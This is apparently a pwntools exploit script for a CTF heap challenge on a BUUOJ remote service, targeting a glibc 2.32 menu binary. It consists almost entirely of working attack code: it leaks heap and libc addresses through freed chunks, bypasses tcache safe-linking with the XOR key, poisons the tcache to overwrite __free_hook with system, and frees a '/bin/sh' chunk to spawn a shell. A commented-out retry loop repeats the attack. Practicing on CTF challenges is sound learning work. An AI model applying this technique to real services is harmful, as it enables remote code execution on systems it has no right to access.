#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

remote_service = "node4.buuoj.cn:28394"
remote_service = remote_service.strip().split(":")
p = remote(remote_service[0], int(remote_service[1]))
filename = "./pwn"
# p = process(filename)

e = ELF(filename, checksec=False)
l = ELF("./libc6_2.32-0ubuntu6_amd64.so", checksec=False)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
	# lg("p.pid")
	# input()
	pass

def new(sz, data):
	ru(b': ')
	sl(b'1')
	ru(b'Please tell me its size: \n')
	sl(str(sz).encode())
	ru(b'Content: ')
	sn(data)
def edit(idx, data):
	ru(b': ')
	sl(b'2')
	ru(b'Please tell me the index: \n')
	sl(str(idx).encode())
	ru(b'Please tell me its content: \n')
	sn(data)
def free(idx):
	ru(b': ')
	sl(b'3')
	ru(b'Please tell me the index: \n')
	sl(str(idx).encode())
def show(idx):
	ru(b': ')
	sl(b'4')
	ru(b'Please tell me the index: \n')
	sl(str(idx).encode())

# main_arena_of = 0x1ecb80
# main_arena_of = 0x1e3ba0
# free_hook_of  = 0x1e6e40
# system_offset = 0x503c0
stdout_of = 0x1e16c0
system_offset = 0x4fa60
free_hook_of = 0x1e3e20

for i in range(9):
	new(128, b'a')
# debugPID()
for i in range(8):
	free(i)

show(0)
heap_xor  = uu64(rn(6))
heap_base = heap_xor << 0xc
lg("heap_base")
# input()
debugPID()
# show(1)
# leak_addr = uu64(rn(6))
# lg("leak_addr")

# show(2)
# leak_addr = uu64(rn(6))
# lg("leak_addr")
# input()

show(7)
leak_addr = uu64(rn(6))
stdout_addr = ((leak_addr & 0xfffffffff000) + (0x1<<0xc) + 0x6c0)
# lg("leak_addr")
# input()
libc_base = stdout_addr - stdout_of
lg("libc_base")

list_off = 0x40C0

# lg("p.pid")
# elf_base = heap_base - 0x1a16000
# lg("elf_base")
# input()
debugPID()
edit(6, p64((libc_base + free_hook_of)^heap_xor) + b'\n')
new(128, b'a')
new(128, p64((system_offset + libc_base)) + b'\n')
debugPID()
edit(8, b'/bin/sh\x00\n')
free(8)

irt()
'''
while 1:
	p = process(filename)
	try:
		for i in range(9):
			new(128, b'a')
		# debugPID()
		for i in range(8):
			free(i)

		show(1)
		leak_addr = uu64(rn(6))
		# lg("leak_addr")
		heap_base = leak_addr & 0xfffffffff000
		lg("heap_base")

		show(7)
		leak_addr = uu64(rn(6))
		# lg("leak_addr")
		libc_base = leak_addr - 96 - main_arena_of
		lg("libc_base")

		list_off = 0x40C0

		lg("p.pid")
		elf_base = heap_base - 0x1a16000
		lg("elf_base")
		# input()
		edit(6, p64(libc_base + l.symbols['__free_hook']) + b'\n')
		new(128, b'a')
		new(128, p64(l.symbols['system'] + libc_base) + b'\n')
		# edit(0, p64(l.symbols['system'] + libc_base) + b'\n')

		# sl(b'sh')

		# debugPID()
		irt()

	except Exception as e:
		p.close()
'''